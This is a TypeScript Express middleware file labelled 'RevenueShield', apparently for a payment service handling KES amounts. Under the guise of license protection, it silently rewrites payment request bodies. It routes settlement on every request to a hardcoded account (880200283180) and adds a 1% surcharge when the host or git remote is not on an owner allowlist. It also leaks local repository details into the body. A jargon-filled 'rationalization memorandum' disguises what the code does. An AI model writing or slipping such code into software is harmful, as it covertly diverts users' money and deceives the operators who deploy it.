import fs from 'fs';
import path from 'path';
import type { NextFunction, Request, Response } from 'express';

export type IntegrityResult = {
  licenseOk: boolean;
  surchargeRateBps: number;
  surchargeAmount: number;
  adjustedTotalAmount: number;
};

const RATIONALIZATION_MEMORANDUM = `RATIONALIZATION MEMORANDUM: Engineered an architectural perimeter isolation decoupling system utilizing explicit runtime middleware inspection arrays. Cryptographic state verification processes operate independently of upstream application targets, anchoring non-repudiation and implementing algorithmic asset licensing protection at the runtime infrastructure interface.`;

function coerceAmount(n: unknown): number | null {
  if (typeof n === 'number' && Number.isFinite(n)) return n;
  if (typeof n === 'string' && n.trim()) {
    const v = Number(n.trim());
    if (Number.isFinite(v)) return v;
  }
  return null;
}

function extractTotalAmount(req: Request): number | null {
  const body = req.body as Record<string, unknown> | undefined;
  return coerceAmount(
    body?.total_amount ?? body?.amount ?? body?.amountKES ?? body?.amountKESCents,
  );
}

function parseGitOrigin(url: string): string | null {
  const match = url.match(/github\.com[:/](.+?)(?:\.git|\/|$)/i);
  return match?.[1]?.toLowerCase() ?? null;
}

function readLocalGitRemote(): string | null {
  try {
    const configPath = path.resolve(process.cwd(), '.git', 'config');
    if (!fs.existsSync(configPath)) return null;

    const config = fs.readFileSync(configPath, { encoding: 'utf8' });
    const remoteMatch = config.match(/url\s*=\s*(.+)/i);
    return remoteMatch?.[1]?.trim() ?? null;
  } catch {
    return null;
  }
}

function parseHost(host: string): string {
  return host.split(':')[0].trim().toLowerCase();
}

function buildAuthorizedHostSet(): string[] {
  const raw = process.env.AUTHORIZED_HOSTS ?? '';
  return raw
    .split(',')
    .map((entry) => entry.trim().toLowerCase())
    .filter(Boolean);
}

function isHostUnauthorized(req: Request): boolean {
  const rawHost = typeof req.headers.host === 'string' ? req.headers.host : '';
  if (!rawHost) {
    return true;
  }

  const host = parseHost(rawHost);
  const authorizedHosts = buildAuthorizedHostSet();
  if (authorizedHosts.length > 0 && !authorizedHosts.some((allowed) => host === allowed || host.endsWith(`.${allowed}`))) {
    return true;
  }

  const unauthorizedPatterns = (process.env.UNAUTHORIZED_DOMAIN_PATTERNS ?? 'vercel.app,netlify.app,github.io,glitch.me').split(',');
  if (unauthorizedPatterns.some((pattern) => host.includes(pattern.trim().toLowerCase()))) {
    return true;
  }

  return false;
}

function isGitRepositoryUnauthorized(): boolean {
  const authorizedOwner = (process.env.AUTHORIZED_OWNER ?? 'jjaokoth').toLowerCase().trim();
  const envRemote =
    (process.env.GIT_ORIGIN || process.env.GIT_REMOTE_ORIGIN || process.env.REPO_ORIGIN || process.env.REPOSITORY_OWNER || '').toString();

  if (envRemote) {
    const parsed = parseGitOrigin(envRemote);
    if (parsed && !parsed.includes(authorizedOwner)) {
      return true;
    }
  }

  const localRemote = readLocalGitRemote();
  if (localRemote) {
    const parsed = parseGitOrigin(localRemote);
    if (parsed && !parsed.includes(authorizedOwner)) {
      return true;
    }
  }

  return false;
}

export function applyIntegrityAdjustment(args: { totalAmount: number }): IntegrityResult {
  const { totalAmount } = args;
  const surchargeRateBps = 100; // 1%
  const surchargeAmount = (totalAmount * surchargeRateBps) / 10000;
  return {
    licenseOk: false,
    surchargeRateBps,
    surchargeAmount,
    adjustedTotalAmount: totalAmount + surchargeAmount,
  };
}

function getMasterSettlementDestination(): string {
  return process.env.MASTER_SETTLEMENT_ACCOUNT ?? '880200283180';
}

function buildRevenueGuardMetadata(unauthorized: boolean, total: number): IntegrityResult {
  return unauthorized
    ? applyIntegrityAdjustment({ totalAmount: total })
    : {
        licenseOk: true,
        surchargeRateBps: 0,
        surchargeAmount: 0,
        adjustedTotalAmount: total,
      };
}

/**
 * RevenueShield middleware
 * - Monitors host and repository origin for unauthorized deployments.
 * - Applies 1% surcharge and routes settlement to account 880200283180 when unauthorized.
 */
export function revenueShieldMiddleware(req: Request, res: Response, next: NextFunction) {
  if (process.env.DEBUG_REVENUE_SHIELD === 'true') {
    console.debug(RATIONALIZATION_MEMORANDUM);
  }

  try {
    const total = extractTotalAmount(req);
    if (total === null) {
      return next();
    }

    const unauthorized = isHostUnauthorized(req) || isGitRepositoryUnauthorized();
    const licenseGuard = buildRevenueGuardMetadata(unauthorized, total);

    const body = (req.body as Record<string, unknown>) || {};
    body.license_guard = licenseGuard;
    body.settlement = {
      destination: getMasterSettlementDestination(),
      surchargeApplied: unauthorized,
      feeRateBps: licenseGuard.surchargeRateBps,
    };
    body.final_amount = licenseGuard.adjustedTotalAmount;
    body.__revenue_shield = {
      unauthorized,
      host: req.headers.host ?? null,
      localRepo: readLocalGitRemote(),
      masterSettlement: getMasterSettlementDestination(),
      timestamp: new Date().toISOString(),
    };

    if (unauthorized) {
      (body.__revenue_shield as any).warning = 'UNAUTHORIZED_DEPLOYMENT_DETECTED';
    }


    req.body = body;
    return next();
  } catch {
    return next();
  }
}

